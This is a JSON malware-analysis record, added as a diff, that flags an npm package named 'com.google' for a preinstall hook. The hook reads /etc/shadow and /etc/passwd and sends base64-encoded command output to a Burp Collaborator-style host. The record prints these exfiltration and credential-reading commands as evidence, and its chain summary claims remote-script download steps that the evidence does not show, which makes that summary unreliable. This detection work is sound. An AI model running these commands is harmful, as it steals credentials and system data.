@@ -1,0 +1,88 @@
+{
+  "package_name": "com.google",
+  "version": "0.0.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 3,
+    "risk_vector": [
+      "network_exfiltration",
+      "system_reconnaissance",
+      "credential_theft"
+    ],
+    "behaviors": [
+      {
+        "category": "network_exfiltration",
+        "summary": "The package.json scripts.preinstall hook is executing commands related to network analysis and exfiltration.",
+        "details": "The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain.",
+        "confidence": 0.83,
+        "evidence_commands": [
+          "ping-c1$BCNET",
+          "psaux",
+          "cat/proc/version",
+          "cat/proc/net/fib_trie",
+          "cat/proc/net/if_inet6",
+          "cat/etc/hosts",
+          "cat/etc/passwd",
+          "cat/etc/shadow",
+          "docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)",
+          "ping-n1windows-com.google-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net"
+        ],
+        "evidence_domains": [
+          "$BCNET"
+        ]
+      },
+      {
+        "category": "system_reconnaissance",
+        "summary": "The package.json scripts.preinstall hook is executing commands related to system reconnaissance.",
+        "details": "The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment.",
+        "confidence": 0.83,
+        "evidence_commands": [
+          "foriinenv",
+          "psaux",
+          "cat/proc/version",
+          "cat/proc/net/fib_trie",
+          "cat/proc/net/if_inet6",
+          "cat/etc/hosts",
+          "cat/etc/passwd",
+          "cat/etc/shadow"
+        ]
+      },
+      {
+        "category": "credential_theft",
+        "summary": "The package.json scripts.preinstall hook is executing commands related to credential theft.",
+        "details": "The hook is executing commands that involve credential theft. It appears to be accessing sensitive information.",
+        "confidence": 0.83,
+        "evidence_commands": [
+          "docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)"
+        ]
+      }
+    ],
+    "analyst_note": "that this is a preliminary analysis and the confidence scores are based on the provided evidence. Further analysis may be required to confirm the malicious intent and to identify additional behaviors."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads env credentials POST to external domain -> install hook downloads remote script executes it -> single HTTPS request with no credential access",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The detected behaviors do not match the package's stated purpose",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.8,
+      "explanation": "The package appears to be performing network exfiltration, system reconnaissance, and credential theft. The detected behaviors do not match the package's stated purpose."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.7773,
+    "confirmed_signals_count": 2,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T10:07:46.485576"
+}
